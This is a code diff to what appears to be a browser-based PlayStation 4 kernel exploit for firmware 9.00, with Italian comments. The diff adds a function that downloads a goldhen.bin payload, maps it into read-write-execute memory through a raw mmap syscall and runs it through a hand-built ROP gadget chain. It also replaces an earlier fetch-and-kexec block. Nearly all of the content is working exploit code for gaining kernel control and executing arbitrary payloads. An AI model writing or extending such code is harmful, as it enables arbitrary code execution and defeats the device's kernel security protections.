@@ -1495,6 +1495,61 @@ async function get_patches(url) {
     }
     return response.arrayBuffer();
 }
+async function loadPayload() {
+    try {
+        const req = new XMLHttpRequest();
+        req.responseType = "arraybuffer";
+        
+        // 1. Caricamento asincrono con gestione errori
+        await new Promise((resolve, reject) => {
+            req.open('GET', 'goldhen.bin');
+            req.onload = () => resolve();
+            req.onerror = () => reject(new Error("Network Error"));
+            req.send();
+        });
+
+        if (req.status !== 200) {
+            throw new Error(`HTTP Error: ${req.status}`);
+        }
+
+        // 2. Allocazione memoria kernel-safe
+        const PLD = req.response;
+        const payload_size = PLD.byteLength;
+        const payload_buffer = chain.syscall(
+            477, // sys_mmap
+            0,
+            payload_size,
+            7, // PROT_READ|PROT_WRITE|PROT_EXEC
+            0x1002, // MAP_ANONYMOUS|MAP_PRIVATE
+            -1,
+            0
+        );
+
+        // 3. Copia precisa senza padding superfluo
+        const payload_view = new Uint8Array(PLD);
+        const kernel_buffer = p.array_from_address(payload_buffer, payload_size);
+        kernel_buffer.set(payload_view);
+
+        // 4. Esecuzione controllata con thread isolato
+        const pthread = spawn_thread(new Chain()
+            .push_gadget('mov rdi, rsp')
+            .push_gadget('sub rsp, 0x20')
+            .push_value(payload_buffer)
+            .push_gadget('call qword ptr [rdi]')
+            .push_gadget('add rsp, 0x20')
+            .push_gadget('ret')
+        );
+
+        // 5. Sincronizzazione finale
+        chain.call('pthread_join', pthread, 0);
+        alert("Payload eseguito con successo!");
+
+    } catch (e) {
+        console.error(`[PAYLOAD ERROR] ${e.message}`);
+        alert(`ERRORE: ${e.message}`);
+        throw e; // Propagazione per gestione esterna
+    }
+}
 
 // 9.00 supported only
 async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
@@ -1598,16 +1653,8 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log('setuid(0)');
     sysi('setuid', 0);
     log('kernel exploit succeeded!');
-	
-    fetch('goldhen.bin')
-        .then(res => res.arrayBuffer())
-        .then(payload => {
-            const exec_addr = chain.sysp('mmap', 0, payload.byteLength, 7, 0x1002, -1, 0);
-            mem.copy(exec_addr, payload);
-            sys_void('kexec', exec_addr);
-            alert("PAYLOAD FIRED!");
-        })
-        .catch(() => alert("PAYLOAD FAILED!"));
+   await loadPayload().catch(() => die("Payload fallito"));
+
   //  alert("kernel exploit succeeded!");
 }
 
